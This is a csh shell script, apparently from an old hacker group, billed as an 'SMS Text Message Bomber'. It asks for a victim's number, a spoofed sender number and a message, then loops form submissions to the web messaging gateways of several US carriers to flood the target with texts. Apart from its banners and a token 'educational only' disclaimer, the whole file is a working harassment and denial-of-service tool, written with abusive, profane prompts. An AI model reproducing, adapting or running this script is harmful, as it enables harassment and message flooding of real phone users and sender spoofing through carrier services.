#!/bin/csh
# by d4yj4y
# SMS Text Message Bomber
# DOS SMS! No way!
# Props and Greet0s go to: aRgus, smurfboy, rC0n, kronixx, sistom
# kokanin,upb,dvdman,mfair and more
# DISCLAIMER: I'm not responsible for what you do with this. Educational only.
# This uses w3c command line tool. Get it from w3c if you dont have.
set tmpfile = ".tmp123"
w3c > $tmpfile
if ( `cat $tmpfile` == "" ) then #Do they have the w3c command line tool installed
clear
echo
echo "Cannot find the w3c command line tool!"
echo "Download it from: http://www.w3.org/ComLine/"
echo "Make sure it is in your PATH as well"
echo
exit
endif
echo "CHUNG CHUNG CHUNG CHUNG CHUNG CHUNG CHUNG CHUNG CHUNG CHUNG"
echo "d4yj4y is up in this bitch - be nice"
echo " " 
echo "Choose a service type below. Only numbers 1-6 are valid"
echo "======================================================="
echo -n "(1=Cingular 2=PCS 3=Nextel 4=ATT 5=Verizon 6=CatherineZetaJones ):"
set service = "$<"
echo -n "Number to send to: "
set number = "$<"
echo -n "Phone number you want to send from: "
set return = "$<"
echo -n "Subject is: "
set subject = "$<"
echo -n "Your mean message: "
set message = "$<"
echo -n "Number of times to send: "
set limit = "$<"
set counter = 1
if ( $service != "1" && $service != "2" && $service != "3" && $service != "4" && $service != "5" && $service != "6" ) then
echo
echo
echo "Enter in a valid service number bitch!"
echo "Then try again genius!"
echo
exit
endif
BOMB:
if ( $service == "1" ) then
w3c -get http://208.62.68.135/msgresult.shtml -form "TO=$number" "FROM=$return" "MESSAGE=$message" "SUBJECT=$subject" "COUNT=25" "CALLBACK=$return" "min=$number" "msg=$message" > /dev/null
endif
if ( $service == "2") then
w3c -get http://messaging.sprintpcs.com/sml/guestCompose.do -form "post=Send" "recipientsAsString=$number" "mobileNumber=$number" "counter=5" "body=$message" "callback=$return" > /dev/null
endif
if ( $service == "3" ) then
w3c -get http://messaging.nextel.com/cgi/iPageExt.dll -form "cmd=sendPage" "oneWayPTNs=$number" "twoWayPTNs=" "from=$return" "subject=$subject" "message=$message" "count=279" "rep1=" "rep2="  "rep3=" "rep4=" "rep5=" "rep6=" "replynumber=$return" "replyemail=" "confaddr=" > /dev/null
endif
if ( $service == "4" ) then
w3c -post http://www.mobile.att.net/messagecenter/pagersend.cgi -form "pin=$number" "from=$return" "subject=$subject" "message=$message" "sizebox=108" > /dev/null
endif
if ( $service == "5" ) then
w3c -post http://www.vtext.com/customer_site/jsp/messaging_lo.rm "trackResponses=No" "Send.x=Yes" "showgroup=n" "DOMAIN_NAME=@vtext.com" "min=$number" "subject=$subject" "text=$message" "sender=$return" "callback=$return" "type=1" "count=3" > /dev/null
endif
if ( $service == "6" ) then
w3c -post http://www.t-mobile.com/messaging/default.asp -form "txtNum=$number" "txtFrom=$return" "txtMessage=$message" "counter=1" "hdnpublic=0" "msgTermsUse=true" > /dev/null
endif
clear;echo Chung sent $counter messages to the fucker;
@ counter ++
if ( $counter > $limit ) then
goto CLIMAX # What, You Don't like my GOTOs?  FUCK YOU.
else
goto BOMB
endif
CLIMAX:
echo "You did it Daniel Son!"
########################CHUNG CHUNG CHUNG###################

